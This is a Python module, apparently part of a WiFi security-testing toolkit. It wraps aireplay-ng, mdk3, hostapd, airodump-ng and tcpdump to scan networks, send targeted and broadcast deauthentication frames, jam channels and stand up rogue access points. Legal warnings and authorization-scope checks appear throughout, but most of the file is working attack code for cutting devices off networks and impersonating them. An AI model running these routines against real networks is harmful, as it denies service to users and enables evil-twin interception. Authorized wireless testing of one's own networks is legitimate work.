"""
WiFi Deauthentication Module
Advanced WiFi security testing and device disconnection functionality.
WARNING: Only use on networks you own or have explicit permission to test.
"""

import logging
import os
import platform
import secrets
import shutil
import subprocess
import tempfile
import time
from dataclasses import dataclass
from typing import Dict, List

try:
    from .scope import require_authorized, require_scope_configured
except ImportError:  # module executed as a top-level script
    from scope import require_authorized, require_scope_configured


@dataclass
class DeauthTarget:
    """Represents a target for deauthentication."""

    mac_address: str
    gateway_mac: str
    ssid: str
    channel: int
    interface: str
    packet_count: int = 64


class WiFiDeauthenticator:
    """
    WiFi deauthentication engine for testing network security.
    Implements IEEE 802.11 deauthentication frame injection.

    WARNING: Unauthorized deauthentication attacks are illegal.
    Only use this for authorized security testing on your own networks.
    """

    def __init__(self, logger: logging.Logger = None):
        """
        Initialize WiFi deauthenticator.

        Args:
            logger: Logger instance
        """
        self.logger = logger or logging.getLogger(__name__)
        self.system = platform.system().lower()
        self._validate_environment()

    def _validate_environment(self):
        """Validate system requirements for deauth operations."""
        if self.system not in ["linux", "darwin"]:
            self.logger.warning(
                "Deauthentication testing is primarily supported on Linux/macOS"
            )

        # Check for required tools
        self._check_airmon_ng()
        self._check_aireplay_ng()

    def _check_airmon_ng(self) -> bool:
        """Check if airmon-ng is installed."""
        # shutil.which is cross-platform; shelling out to the Unix-only
        # "which" binary would raise FileNotFoundError on Windows.
        try:
            return shutil.which("airmon-ng") is not None
        except Exception as e:
            self.logger.warning(f"airmon-ng not found: {e}")
            return False

    def _check_aireplay_ng(self) -> bool:
        """Check if aireplay-ng is installed."""
        try:
            return shutil.which("aireplay-ng") is not None
        except Exception as e:
            self.logger.warning(f"aireplay-ng not found: {e}")
            return False

    def enable_monitor_mode(self, interface: str) -> bool:
        """
        Enable monitor mode on wireless interface.

        Args:
            interface: Wireless interface name (e.g., 'wlan0')

        Returns:
            True if successful, False otherwise
        """
        if self.system != "linux":
            self.logger.error("Monitor mode setup is only supported on Linux")
            return False

        try:
            # Kill interfering processes
            subprocess.run(
                ["sudo", "airmon-ng", "check", "kill"], capture_output=True, timeout=10
            )

            # Enable monitor mode
            result = subprocess.run(
                ["sudo", "airmon-ng", "start", interface],
                capture_output=True,
                text=True,
                timeout=10,
            )

            if result.returncode == 0:
                self.logger.info(f"Monitor mode enabled on {interface}")
                return True
            else:
                self.logger.error(f"Failed to enable monitor mode: {result.stderr}")
                return False

        except subprocess.TimeoutExpired:
            self.logger.error("Monitor mode setup timed out")
            return False
        except Exception as e:
            self.logger.error(f"Error enabling monitor mode: {e}")
            return False

    def disable_monitor_mode(self, interface: str) -> bool:
        """
        Disable monitor mode on wireless interface.

        Args:
            interface: Monitor interface name

        Returns:
            True if successful, False otherwise
        """
        if self.system != "linux":
            return False

        try:
            # Disable monitor mode
            subprocess.run(
                ["sudo", "airmon-ng", "stop", interface],
                capture_output=True,
                text=True,
                timeout=10,
            )

            # Restart networking
            subprocess.run(
                ["sudo", "systemctl", "restart", "networking"],
                capture_output=True,
                timeout=10,
            )

            self.logger.info(f"Monitor mode disabled on {interface}")
            return True

        except Exception as e:
            self.logger.error(f"Error disabling monitor mode: {e}")
            return False

    def get_wireless_interfaces(self) -> List[str]:
        """
        Get list of wireless interfaces.

        Returns:
            List of wireless interface names
        """
        interfaces = []

        if self.system == "linux":
            try:
                result = subprocess.run(
                    ["iwconfig"], capture_output=True, text=True, timeout=5
                )

                # Parse iwconfig output
                for line in result.stdout.split("\n"):
                    if "IEEE 802.11" in line:
                        interface = line.split()[0]
                        interfaces.append(interface)

            except Exception as e:
                self.logger.debug(f"Error getting wireless interfaces: {e}")

        return interfaces

    def scan_nearby_networks(self, interface: str, duration: int = 10) -> List[Dict]:
        """
        Scan for nearby WiFi networks.

        Args:
            interface: Monitor mode interface
            duration: Scan duration in seconds

        Returns:
            List of nearby networks with details (bssid, ssid, channel,
            privacy, power). Empty if airodump-ng is missing or finds
            nothing.
        """
        if self.system != "linux":
            self.logger.error("WiFi scanning is only supported on Linux")
            return []

        # Capture files go into a private temp dir -- never a predictable
        # /tmp path. airodump-ng appends its own suffixes to the prefix.
        scan_dir = tempfile.mkdtemp(prefix="shibacuddles_scan_")
        scan_prefix = os.path.join(scan_dir, "scan")
        try:
            try:
                # airodump-ng runs until killed; the timeout ending it is
                # the normal path, not an error.
                subprocess.run(
                    [
                        "sudo",
                        "airodump-ng",
                        "-w",
                        scan_prefix,
                        "-o",
                        "csv",
                        "--write-interval",
                        str(duration),
                        interface,
                    ],
                    capture_output=True,
                    text=True,
                    timeout=duration + 5,
                )
            except subprocess.TimeoutExpired:
                pass  # expected: airodump-ng runs until we stop it

            networks = self._parse_airodump_csv(scan_dir)
            self.logger.info(f"WiFi scan complete: {len(networks)} networks")
            return networks
        except Exception as e:
            self.logger.error(f"Error scanning networks: {e}")
            return []
        finally:
            shutil.rmtree(scan_dir, ignore_errors=True)

    @staticmethod
    def _parse_airodump_csv(scan_dir: str) -> List[Dict]:
        """Parse airodump-ng CSV capture files into network dicts.

        Reads the access-point section (everything before the
        "Station MAC" line). Best effort: ESSIDs containing commas shift
        columns, so the SSID is rebuilt from the trailing fields.
        """
        networks = []
        try:
            names = sorted(os.listdir(scan_dir))
        except OSError:
            return networks
        for name in names:
            if not name.endswith(".csv"):
                continue
            path = os.path.join(scan_dir, name)
            try:
                with open(path, "r", encoding="utf-8", errors="ignore") as fh:
                    for line in fh:
                        line = line.strip()
                        if not line:
                            continue
                        if line.startswith("Station MAC"):
                            break  # end of the access-point section
                        if line.startswith("BSSID"):
                            continue  # header row
                        parts = [p.strip() for p in line.split(",")]
                        if len(parts) < 14 or not parts[0]:
                            continue
                        # Rebuild the SSID from the trailing fields: an
                        # ESSID containing commas shifts the columns. Join
                        # the unstripped tail so spaces inside the SSID
                        # survive (stripping first would turn
                        # "Cafe, Free, WiFi" into "Cafe,Free,WiFi").
                        ssid = ",".join(line.split(",")[13:]).rstrip(",").strip()
                        networks.append(
                            {
                                "bssid": parts[0],
                                "channel": parts[3],
                                "privacy": parts[5],
                                "power": parts[8],
                                "ssid": ssid,
                            }
                        )
            except OSError:
                continue
        return networks

    def deauthenticate_device(self, target: DeauthTarget) -> bool:
        """
        Send deauthentication frames to target device.

        Args:
            target: DeauthTarget with device information

        Returns:
            True if deauthentication sent successfully
        """
        require_authorized(
            ssid=target.ssid, bssid=target.gateway_mac, action="deauthenticate_device"
        )
        if self.system != "linux":
            self.logger.error("Deauthentication is only supported on Linux")
            return False

        self.logger.warning(
            f"LEGAL WARNING: Deauthenticating {target.mac_address} on {target.ssid}. "
            f"Ensure you have permission to perform this action."
        )

        try:
            # Send deauth frames using aireplay-ng
            result = subprocess.run(
                [
                    "sudo",
                    "aireplay-ng",
                    "--deauth",
                    str(target.packet_count),
                    "-a",
                    target.gateway_mac,
                    "-c",
                    target.mac_address,
                    target.interface,
                ],
                capture_output=True,
                text=True,
                timeout=30,
            )

            if result.returncode == 0:
                self.logger.info(
                    f"Deauthentication sent to {target.mac_address} "
                    f"({target.packet_count} frames)"
                )
                return True
            else:
                self.logger.error(f"Deauthentication failed: {result.stderr}")
                return False

        except subprocess.TimeoutExpired:
            self.logger.error("Deauthentication timed out")
            return False
        except Exception as e:
            self.logger.error(f"Error during deauthentication: {e}")
            return False

    def deauthenticate_all_devices(
        self, gateway_mac: str, ssid: str, interface: str, duration: int = 30
    ) -> int:
        """
        Deauthenticate all connected devices from a network.

        Args:
            gateway_mac: MAC address of gateway/AP
            ssid: Network SSID
            interface: Monitor mode interface
            duration: How long to send deauth frames (seconds)

        Returns:
            0 always; the underlying aireplay-ng process runs in continuous
            deauth mode ("--deauth 0") so no per-frame count is available.
            (A return of 0 does NOT mean "0 frames sent".)
        """
        require_authorized(
            ssid=ssid, bssid=gateway_mac, action="deauthenticate_all_devices"
        )
        if self.system != "linux":
            self.logger.error("Broadcast deauthentication is only supported on Linux")
            return 0

        self.logger.warning(
            f"LEGAL WARNING: Broadcasting deauthentication frames to all "
            f"devices on {ssid}. Ensure you have permission."
        )

        try:
            # Broadcast deauth to all clients
            subprocess.run(
                ["sudo", "aireplay-ng", "--deauth", "0", "-a", gateway_mac, interface],
                capture_output=True,
                text=True,
                timeout=duration,
            )

            self.logger.info(f"Broadcast deauthentication completed on {ssid}")
            return 0  # 0 means continuous until stopped

        except subprocess.TimeoutExpired:
            self.logger.info(f"Broadcast deauthentication ran for {duration}s")
            return 0
        except Exception as e:
            self.logger.error(f"Error during broadcast deauth: {e}")
            return 0

    def create_rogue_ap(self, interface: str, ssid: str, channel: int = 6) -> bool:
        """
        Create a rogue access point for testing.

        Args:
            interface: Monitor mode interface
            ssid: SSID for rogue AP
            channel: WiFi channel

        Returns:
            True if successful
        """
        require_authorized(ssid=ssid, action="create_rogue_ap")
        if self.system != "linux":
            self.logger.error("Rogue AP creation is only supported on Linux")
            return False

        self.logger.warning(f"Creating rogue AP: {ssid}")

        try:
            # Use hostapd to create AP.
            # A fresh random WPA passphrase is generated on every run --
            # credentials must never be hardcoded.
            passphrase = secrets.token_urlsafe(16)
            print(f"[+] Rogue AP WPA passphrase (generated, shown once): {passphrase}")
            config = self._generate_hostapd_config(interface, ssid, channel, passphrase)

            # Write the config to a private temp file (never a predictable
            # /tmp path) and always delete it afterwards.
            fd, hostapd_conf = tempfile.mkstemp(
                prefix="shibacuddles_hostapd_", suffix=".conf"
            )
            os.close(fd)
            try:
                with open(hostapd_conf, "w") as f:
                    f.write(config)

                result = subprocess.run(
                    ["sudo", "hostapd", hostapd_conf], capture_output=True, timeout=60
                )

                return result.returncode == 0
            finally:
                try:
                    os.unlink(hostapd_conf)
                except OSError:
                    pass

        except Exception as e:
            self.logger.error(f"Error creating rogue AP: {e}")
            return False

    def _generate_hostapd_config(
        self, interface: str, ssid: str, channel: int, passphrase: str
    ) -> str:
        """
        Generate hostapd configuration.

        Args:
            interface: Network interface
            ssid: SSID name
            channel: WiFi channel
            passphrase: WPA2 passphrase

        Returns:
            Configuration string

        Raises:
            ValueError: If any value could break out of its config line
                (CR/LF injection) or the channel is not a valid integer.
        """
        interface = _require_single_line(interface, "interface")
        ssid = _require_single_line(ssid, "ssid")
        try:
            channel = int(channel)
        except (TypeError, ValueError):
            raise ValueError(f"channel must be an integer, got {channel!r}")
        if not 1 <= channel <= 196:
            raise ValueError(f"channel out of WiFi range: {channel}")
        return f"""
interface={interface}
ssid={ssid}
channel={channel}
driver=nl80211
wpa=2
wpa_passphrase={passphrase}
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
"""


def _require_single_line(value: str, name: str) -> str:
    """Reject CR/LF in a hostapd.conf value.

    A newline inside ``interface`` or ``ssid`` would inject extra hostapd
    directives into the generated config file. SSIDs can legally contain
    newline bytes (up to 32 arbitrary octets), so this raises instead of
    stripping: stripping would silently change the SSID under test.
    """
    text = str(value)
    if "\r" in text or "\n" in text:
        raise ValueError(f"{name} must not contain CR or LF characters")
    return text


class NetworkInterruptor:
    """
    Advanced network interruption and interference testing.
    """

    def __init__(self, logger: logging.Logger = None):
        """Initialize network interruptor."""
        self.logger = logger or logging.getLogger(__name__)

    def jam_channel(self, interface: str, channel: int, duration: int = 10) -> bool:
        """
        Perform WiFi channel jamming for security testing.

        Args:
            interface: Monitor interface
            channel: Channel to jam
            duration: Duration in seconds

        Returns:
            True if jamming started
        """
        require_scope_configured(action="jam_channel")
        self.logger.warning(f"Jamming channel {channel} for {duration} seconds")
        self.logger.warning(
            "This is a network disruption attack - use only for authorized testing"
        )

        proc = None
        try:
            # Use mdk3 for WiFi jamming; keep the handle so the jammer is
            # always terminated instead of being orphaned after we return.
            proc = subprocess.Popen(
                ["sudo", "mdk3", interface, "b", "-c", str(channel)],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

            time.sleep(duration)
            return True

        except Exception as e:
            self.logger.error(f"Error jamming channel: {e}")
            return False
        finally:
            if proc is not None and proc.poll() is None:
                proc.terminate()
                try:
                    proc.wait(timeout=5)
                except Exception:
                    proc.kill()

    def analyze_traffic_patterns(self, interface: str, duration: int = 30) -> Dict:
        """
        Analyze network traffic patterns.

        Args:
            interface: Interface to sniff
            duration: Capture duration in seconds

        Returns:
            Dictionary with capture metadata. NOTE: packet-level analysis
            is not implemented yet -- protocol breakdowns are empty and
            total_packets is 0. The capture itself runs; only the parsing
            is a stub.
        """
        # Private temp file, never a predictable /tmp path: tcpdump runs
        # under sudo, and a pre-planted symlink at a fixed path would let
        # another user redirect the capture output.
        fd, pcap_path = tempfile.mkstemp(prefix="shibacuddles_traffic_", suffix=".pcap")
        os.close(fd)
        try:
            # Use tcpdump to capture traffic
            subprocess.run(
                ["sudo", "tcpdump", "-i", interface, "-c", "1000", "-w", pcap_path],
                capture_output=True,
                timeout=duration,
            )

            # Packet parsing not implemented yet (see docstring).
            stats = {
                "total_packets": 0,
                "protocols": {},
                "top_ips": [],
                "duration": duration,
            }

            return stats

        except Exception as e:
            self.logger.error(f"Error analyzing traffic: {e}")
            return {}
        finally:
            try:
                os.unlink(pcap_path)
            except OSError:
                pass
